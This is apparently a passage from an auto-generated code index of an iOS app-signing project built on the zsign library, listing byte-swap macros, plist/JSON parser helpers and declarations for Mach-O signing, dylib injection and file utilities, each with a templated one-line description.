(((x) & 0x0000FF0000000000ull) >> 24) | (((x) & 0x000000FF00000000ull) >> 8) |                                    \
(((x) & 0x00000000FF000000ull) << 8) | (((x) & 0x0000000000FF0000ull) << 24) |                                    \
(((x) & 0x000000000000FF00ull) << 40) | (((x) & 0x00000000000000FFull) << 56))"
615,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function BE32TOH - implements be32toh functionality","#define BE32TOH(x)                                                                                                     \
((((x) & 0xFF000000) >> 24) | (((x) & 0x00FF0000) >> 8) | (((x) & 0x0000FF00) << 8) | (((x) & 0x000000FF) << 24))

#define BE64TOH(x)                                                                                                     \
((((x) & 0xFF00000000000000ull) >> 56) | (((x) & 0x00FF000000000000ull) >> 40) |                                   \
(((x) & 0x0000FF0000000000ull) >> 24) | (((x) & 0x000000FF00000000ull) >> 8) |                                    \
(((x) & 0x00000000FF000000ull) << 8) | (((x) & 0x0000000000FF0000ull) << 24) |                                    \
(((x) & 0x000000000000FF00ull) << 40) | (((x) & 0x00000000000000FFull) << 56))

//////////////////////////////////////////////////////////////////////////"
616,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function BE64TOH - implements be64toh functionality","#define BE64TOH(x)                                                                                                     \
((((x) & 0xFF00000000000000ull) >> 56) | (((x) & 0x00FF000000000000ull) >> 40) |                                   \
(((x) & 0x0000FF0000000000ull) >> 24) | (((x) & 0x000000FF00000000ull) >> 8) |                                    \
(((x) & 0x00000000FF000000ull) << 8) | (((x) & 0x0000000000FF0000ull) << 24) |                                    \
(((x) & 0x000000000000FF00ull) << 40) | (((x) & 0x00000000000000FFull) << 56))

//////////////////////////////////////////////////////////////////////////
PReader::PReader()
{"
617,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function parseBinary - implements parsebinary functionality","return parseBinary(pdoc, len, root);"
618,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function readValue - implements readvalue functionality","return readValue(root, token);"
619,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function decodeNumber - implements decodenumber functionality","return decodeNumber(token, pval);"
620,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function decodeDouble - implements decodedouble functionality","return decodeDouble(token, pval);"
621,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function readArray - implements readarray functionality","return readArray(pval);"
622,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function readDictionary - implements readdictionary functionality","return readDictionary(pval);"
623,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function addError - implements adderror functionality","return addError(""Syntax error: value, dictionary or array expected."", token.pbeg);"
624,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function readToken - implements readtoken functionality","return readToken(token);"
625,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function readToken - implements readtoken functionality","return readToken(token);"
626,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function addError - implements adderror functionality","return addError(""Missing '</dict>' or dictionary member name"", key.pbeg);"
627,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function decodeDouble - implements decodedouble functionality","return decodeDouble(token, pval);"
628,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function addError - implements adderror functionality","return addError(""'"" + string(token.pbeg, token.pend) + ""' is not a number."", token.pbeg);"
629,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function addError - implements adderror functionality","return addError(""'"" + string(token.pbeg, token.pend) + ""' is too large or not a number."", token.pbeg);"
630,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function BE64TOH - implements be64toh functionality","return BE64TOH(*((uint64_t *)v));"
631,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function BE32TOH - implements be32toh functionality","return BE32TOH(*((uint32_t *)v));"
632,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function getUInt24FromBE - retrieves uint24frombe","return getUInt24FromBE(v);"
633,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function BE16TOH - implements be16toh functionality","return BE16TOH(*((uint16_t *)v));"
634,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function sizeof - implements sizeof functionality","case sizeof(uint8_t):
case sizeof(uint16_t):
case sizeof(uint32_t):
case sizeof(uint64_t):
{"
635,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function sizeof - implements sizeof functionality","case sizeof(uint16_t):
case sizeof(uint32_t):
case sizeof(uint64_t):
{"
636,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function sizeof - implements sizeof functionality","case sizeof(uint32_t):
case sizeof(uint64_t):
{"
637,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function sizeof - implements sizeof functionality","case sizeof(uint64_t):
{"
638,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function sizeof - implements sizeof functionality","case sizeof(float):
pv = static_cast<double>(*reinterpret_cast<float *>(buf));"
639,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function sizeof - implements sizeof functionality","case sizeof(double):
pv = *reinterpret_cast<double *>(buf);"
640,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function readBinaryValue - implements readbinaryvalue functionality","return readBinaryValue(pval, pv);"
641,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/openssl_tools.mm","Function p12_password_check - implements p12 password check functionality","bool p12_password_check(NSString *file, NSString *pass)
{"
642,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/openssl_tools.mm","This function validates a mobile provision file It reads the file and performs basic validation  TODO: Improve validation logic","void provision_file_validation(NSString *path)
{"
643,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/openssl_tools.mm","Function generate_root_ca_pair - implements generate root ca pair functionality","void generate_root_ca_pair(const char *basename)
{"
644,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.mm","Function InjectDyLib - implements injectdylib functionality","bool InjectDyLib(NSString *filePath, NSString *dylibPath, bool weakInject, bool bCreate)
{"
645,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.mm","Function ListDylibs - implements listdylibs functionality","bool ListDylibs(NSString *filePath, NSMutableArray *dylibPathsArray)
{"
646,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.mm","Function UninstallDylibs - implements uninstalldylibs functionality","bool UninstallDylibs(NSString *filePath, NSArray<NSString *> *dylibPathsArray)
{"
647,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.mm","Function ChangeDylibPath - implements changedylibpath functionality","bool ChangeDylibPath(NSString *filePath, NSString *oldPath, NSString *newPath)
{"
648,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.mm","Function zsign - implements zsign functionality","int zsign(NSString *app, NSString *prov, NSString *key, NSString *pass, NSString *bundleid, NSString *displayname,
NSString *bundleversion, bool dontGenerateEmbeddedMobileProvision)
{"
649,cpp,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h","class ZArchO - implements functionality related to z arch o","class ZArchO
{"
650,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h","Function Init - implements init functionality","bool Init(uint8_t *pBase, uint32_t uLength);"
651,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h","Function Sign - implements sign functionality","bool Sign(ZSignAsset *pSignAsset, bool bForce, const string &strBundleId, const string &strInfoPlistSHA1,
const string &strInfoPlistSHA256, const string &strCodeResourcesData);"
652,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h","Function PrintInfo - implements printinfo functionality","void PrintInfo() const;"
653,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h","Function IsExecute - implements isexecute functionality","bool IsExecute();"
654,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h","Function InjectDyLib - implements injectdylib functionality","bool InjectDyLib(bool bWeakInject, const char *szDyLibPath, bool &bCreate);"
655,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h","Function ReallocCodeSignSpace - implements realloccodesignspace functionality","uint32_t ReallocCodeSignSpace(const string &strNewFile);"
656,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h","Function uninstallDylibs - implements uninstalldylibs functionality","void uninstallDylibs(const set<string> &dylibNames);"
657,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h","Function ChangeDylibPath - implements changedylibpath functionality","bool ChangeDylibPath(const char *oldPath, const char *newPath);"
658,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h","Function BO - implements bo functionality","uint32_t BO(uint32_t uValue) const;"
659,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h","Function BuildCodeSignature - implements buildcodesignature functionality","bool BuildCodeSignature(ZSignAsset *pSignAsset, bool bForce, const string &strBundleId,
const string &strInfoPlistSHA1, const string &strInfoPlistSHA256,
const string &strCodeResourcesSHA1, const string &strCodeResourcesSHA256,
string &strOutput);"
660,cpp,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h","class ZAppBundle - implements functionality related to z app bundle","class ZAppBundle
{"
661,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h","Function SignFolder - implements signfolder functionality","bool SignFolder(ZSignAsset *pSignAsset, const string &strFolder, const string &strBundleID,
const string &strBundleVersion, const string &strDisplayName, const string &strDyLibFile,
bool bForce, bool bWeakInject, bool bEnableCache, bool dontGenerateEmbeddedMobileProvision);"
662,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h","Function SignNode - implements signnode functionality","bool SignNode(JValue &jvNode);"
663,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h","Function GetNodeChangedFiles - implements getnodechangedfiles functionality","void GetNodeChangedFiles(JValue &jvNode, bool dontGenerateEmbeddedMobileProvision);"
664,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h","Function GetChangedFiles - implements getchangedfiles functionality","void GetChangedFiles(JValue &jvNode, vector<string> &arrChangedFiles);"
665,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h","Function GetPlugIns - implements getplugins functionality","void GetPlugIns(const string &strFolder, vector<string> &arrPlugIns);"
666,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h","Function FindAppFolder - implements findappfolder functionality","bool FindAppFolder(const string &strFolder, string &strAppFolder);"
667,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h","Function GetObjectsToSign - implements getobjectstosign functionality","bool GetObjectsToSign(const string &strFolder, JValue &jvInfo);"
668,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h","Function GetSignFolderInfo - implements getsignfolderinfo functionality","bool GetSignFolderInfo(const string &strFolder, JValue &jvNode, bool bGetName = false);"
669,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h","Function GenerateCodeResources - implements generatecoderesources functionality","bool GenerateCodeResources(const string &strFolder, JValue &jvCodeRes);"
670,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h","Function GetFolderFiles - implements getfolderfiles functionality","void GetFolderFiles(const string &strFolder, const string &strBaseFolder, set<string> &setFiles);"
671,cpp,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h","class ZMachO - implements functionality related to z mach o","class ZMachO
{"
672,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h","Function Init - implements init functionality","bool Init(const char *szFile);"
673,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h","Function InitV - implements initv functionality","bool InitV(const char *szFormatPath, ...);"
674,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h","Function Free - implements free functionality","bool Free();"
675,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h","Function PrintInfo - implements printinfo functionality","void PrintInfo();"
676,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h","Function Sign - implements sign functionality","bool Sign(ZSignAsset *pSignAsset, bool bForce, string strBundleId, string strInfoPlistSHA1,
string strInfoPlistSHA256, const string &strCodeResourcesData);"
677,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h","Function InjectDyLib - implements injectdylib functionality","bool InjectDyLib(bool bWeakInject, const char *szDyLibPath, bool &bCreate);"
678,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h","Function ChangeDylibPath - implements changedylibpath functionality","bool ChangeDylibPath(const char *oldPath, const char *newPath);"
679,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h","Function RemoveDylib - implements removedylib functionality","bool RemoveDylib(const std::set<std::string> &dylibNames);"
680,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h","Function OpenFile - implements openfile functionality","bool OpenFile(const char *szPath);"
681,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h","Function CloseFile - implements closefile functionality","bool CloseFile();"
682,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h","Function NewArchO - implements newarcho functionality","bool NewArchO(uint8_t *pBase, uint32_t uLength);"
683,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h","Function FreeArchOes - implements freearchoes functionality","void FreeArchOes();"
684,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h","Function ReallocCodeSignSpace - implements realloccodesignspace functionality","bool ReallocCodeSignSpace();"
685,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.h","Function GetCertSubjectCN - implements getcertsubjectcn functionality","bool GetCertSubjectCN(const string &strCertData, string &strSubjectCN);"
686,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.h","Function GetCMSInfo - implements getcmsinfo functionality","bool GetCMSInfo(uint8_t *pCMSData, uint32_t uCMSLength, JValue &jvOutput);"
687,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.h","Function GetCMSContent - implements getcmscontent functionality","bool GetCMSContent(const string &strCMSDataInput, string &strContentOutput);"
688,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.h","Function GenerateCMS - implements generatecms functionality","bool GenerateCMS(const string &strSignerCertData, const string &strSignerPKeyData, const string &strCDHashData,
const string &strCDHashesPlist, string &strCMSOutput);"
689,cpp,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.h","class ZSignAsset - implements functionality related to z sign asset","class ZSignAsset
{"
690,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.h","Function GenerateCMS - implements generatecms functionality","bool GenerateCMS(const string &strCDHashData, const string &strCDHashesPlist,
const string &strCodeDirectorySlotSHA1, const string &strAltnateCodeDirectorySlot256,
string &strCMSOutput);"
691,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.h","Function Init - implements init functionality","bool Init(const string &strSignerCertFile, const string &strSignerPKeyFile, const string &strProvisionFile,
const string &strEntitlementsFile, const string &strPassword);"
692,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.h","Function ParseCodeSignature - implements parsecodesignature functionality","bool ParseCodeSignature(uint8_t *pCSBase);"
693,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.h","Function SlotBuildEntitlements - implements slotbuildentitlements functionality","bool SlotBuildEntitlements(const string &strEntitlements, string &strOutput);"
694,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.h","Function SlotBuildDerEntitlements - implements slotbuildderentitlements functionality","bool SlotBuildDerEntitlements(const string &strEntitlements, string &strOutput);"
695,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.h","Function SlotBuildRequirements - implements slotbuildrequirements functionality","bool SlotBuildRequirements(const string &strBundleID, const string &strSubjectCN, string &strOutput);"
696,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.h","Function GetCodeSignatureCodeSlotsData - implements getcodesignaturecodeslotsdata functionality","bool GetCodeSignatureCodeSlotsData(uint8_t *pCSBase, uint8_t *&pCodeSlots1, uint32_t &uCodeSlots1Length,
uint8_t *&pCodeSlots256, uint32_t &uCodeSlots256Length);"
697,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.h","Function SlotBuildCodeDirectory - implements slotbuildcodedirectory functionality","bool SlotBuildCodeDirectory(bool bAlternate, uint8_t *pCodeBase, uint32_t uCodeLength, uint8_t *pCodeSlotsData,
uint32_t uCodeSlotsDataLength, uint64_t execSegLimit, uint64_t execSegFlags,
const string &strBundleId, const string &strTeamId, const string &strInfoPlistSHA,
const string &strRequirementsSlotSHA, const string &strCodeResourcesSHA,
const string &strEntitlementsSlotSHA, const string &strDerEntitlementsSlotSHA,
bool isExecuteArch, string &strOutput);"
698,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.h","Function SlotBuildCMSSignature - implements slotbuildcmssignature functionality","bool SlotBuildCMSSignature(ZSignAsset *pSignAsset, const string &strCodeDirectorySlot,
const string &strAltnateCodeDirectorySlot, string &strOutput);"
699,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.h","Function GetCodeSignatureExistsCodeSlotsData - implements getcodesignatureexistscodeslotsdata functionality","bool GetCodeSignatureExistsCodeSlotsData(uint8_t *pCSBase, uint8_t *&pCodeSlots1Data, uint32_t &uCodeSlots1DataLength,
uint8_t *&pCodeSlots256Data, uint32_t &uCodeSlots256DataLength);"
700,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.h","Function GetCodeSignatureLength - implements getcodesignaturelength functionality","uint32_t GetCodeSignatureLength(uint8_t *pCSBase);"
701,cpp,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/base64.h","class ZBase64 - implements functionality related to z base","class ZBase64
{"
702,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function LE - implements le functionality","#define LE(x) _Swap(x)
#define BE(x) _Swap(x)

#if !defined(S_ISREG) && defined(S_IFMT) && defined(S_IFREG)
#define S_ISREG(m) (((m) & S_IFMT) == S_IFREG)
#endif

uint16_t _Swap(uint16_t value);"
703,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function BE - implements be functionality","#define BE(x) _Swap(x)

#if !defined(S_ISREG) && defined(S_IFMT) && defined(S_IFREG)
#define S_ISREG(m) (((m) & S_IFMT) == S_IFREG)
#endif

uint16_t _Swap(uint16_t value);"
704,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function S_ISREG - implements s isreg functionality","#define S_ISREG(m) (((m) & S_IFMT) == S_IFREG)
#endif

uint16_t _Swap(uint16_t value);"
705,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function _Swap - implements  swap functionality","uint16_t _Swap(uint16_t value);"
706,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function _Swap - implements  swap functionality","uint32_t _Swap(uint32_t value);"
707,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function _Swap - implements  swap functionality","uint64_t _Swap(uint64_t value);"
708,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function ReadFile - implements readfile functionality","bool ReadFile(const char *szFile, string &strData);"
709,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function ReadFile - implements readfile functionality","bool ReadFile(string &strData, const char *szFormatPath, ...);"
710,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function WriteFile - implements writefile functionality","bool WriteFile(const char *szFile, const string &strData);"
711,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function WriteFile - implements writefile functionality","bool WriteFile(const char *szFile, const char *szData, size_t sLen);"
712,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function WriteFile - implements writefile functionality","bool WriteFile(string &strData, const char *szFormatPath, ...);"
713,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function WriteFile - implements writefile functionality","bool WriteFile(const char *szData, size_t sLen, const char *szFormatPath, ...);"
714,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function AppendFile - implements appendfile functionality","bool AppendFile(const char *szFile, const string &strData);"
715,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function AppendFile - implements appendfile functionality","bool AppendFile(const char *szFile, const char *szData, size_t sLen);"
716,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function AppendFile - implements appendfile functionality","bool AppendFile(const string &strData, const char *szFormatPath, ...);"
717,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function IsRegularFile - implements isregularfile functionality","bool IsRegularFile(const char *szFile);"
718,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function IsFolder - implements isfolder functionality","bool IsFolder(const char *szFolder);"
719,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function IsFolderV - implements isfolderv functionality","bool IsFolderV(const char *szFormatPath, ...);"
720,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function CreateFolder - implements createfolder functionality","bool CreateFolder(const char *szFolder);"
721,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function CreateFolderV - implements createfolderv functionality","bool CreateFolderV(const char *szFormatPath, ...);"
722,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function RemoveFile - implements removefile functionality","bool RemoveFile(const char *szFile);"
723,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function RemoveFileV - implements removefilev functionality","bool RemoveFileV(const char *szFormatPath, ...);"
724,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function RemoveFolder - implements removefolder functionality","bool RemoveFolder(const char *szFolder);"
725,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function RemoveFolderV - implements removefolderv functionality","bool RemoveFolderV(const char *szFormatPath, ...);"
726,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function IsFileExists - implements isfileexists functionality","bool IsFileExists(const char *szFile);"
727,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function IsFileExistsV - implements isfileexistsv functionality","bool IsFileExistsV(const char *szFormatPath, ...);"
728,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function GetFileSize - implements getfilesize functionality","int64_t GetFileSize(int fd);"
729,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function GetFileSize - implements getfilesize functionality","int64_t GetFileSize(const char *szFile);"
730,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function GetFileSizeV - implements getfilesizev functionality","int64_t GetFileSizeV(const char *szFormatPath, ...);"
731,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function GetFileSizeString - implements getfilesizestring functionality","string GetFileSizeString(const char *szFile);"
732,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function IsZipFile - implements iszipfile functionality","bool IsZipFile(const char *szFile);"
733,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function GetCanonicalizePath - implements getcanonicalizepath functionality","string GetCanonicalizePath(const char *szPath);"
734,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function IsPathSuffix - implements ispathsuffix functionality","bool IsPathSuffix(const string &strPath, const char *suffix);"
735,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function StringSplit - implements stringsplit functionality","void StringSplit(const string &src, const string &split, vector<string> &dest);"
736,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function FormatSize - implements formatsize functionality","string FormatSize(int64_t size, int64_t base = 1024);"
737,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function GetUnixStamp - implements getunixstamp functionality","time_t GetUnixStamp();"
738,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function GetMicroSecond - implements getmicrosecond functionality","uint64_t GetMicroSecond();"
739,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function SystemExec - implements systemexec functionality","bool SystemExec(const char *szFormatCmd, ...);"
740,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function ByteAlign - implements bytealign functionality","uint32_t ByteAlign(uint32_t uValue, uint32_t uAlign);"
741,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function SHASum - implements shasum functionality","bool SHASum(int nSumType, uint8_t *data, size_t size, string &strOutput);"
